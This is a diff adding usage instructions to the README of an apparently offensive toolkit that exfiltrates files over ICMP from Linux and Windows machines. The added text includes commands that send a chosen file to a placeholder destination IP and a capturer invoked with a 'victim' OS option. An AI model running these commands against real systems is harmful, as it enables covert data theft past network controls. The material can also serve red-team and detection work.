@@ -5,7 +5,34 @@ This repository contains the necessary scripts to exfiltrate the contents of a f
 - **winIcmpExfiltration.ps1**: Powershell script to exfiltrate a file from a Windows machine.
 - **icmpCapture.py**: Script to capture the exfiltrated file.
 
+For more details on what these scripts do, check the [More Information](#more-information) section.
 
+## Requirements
+To exfiltrate:
+- None. Just connectivity to the capturer machine. Both scripts use system tools.
+
+To capture exfiltrated file:
+- Python **scapy** library.
+
+
+## How to use
+### Exfiltrating from a Linux
+```bash
+python3 icmpExfiltration.py -d <your_IP> -f <file>
+```
+
+### Exfiltrating from a Windows
+```bash
+winIcmpExfiltration.ps1
+```
+![Windows Exfiltration Example](images/ICMP-Exfiltration-7.png)
+
+### Capturing the exfiltrated files
+For both exfiltrations, use **icmpCapturer.py** in a Linux machine to capture the file contents.
+```bash
+python3 icmpCapturer.py -l <listener_IP> -f <destination_file> -o <victim_OS>
+```
+![Capturing Exfiltration Example](images/ICMP-Exfiltration-8.png)
 
 ## More Information
 ### Using ICMP for Data Exfiltration
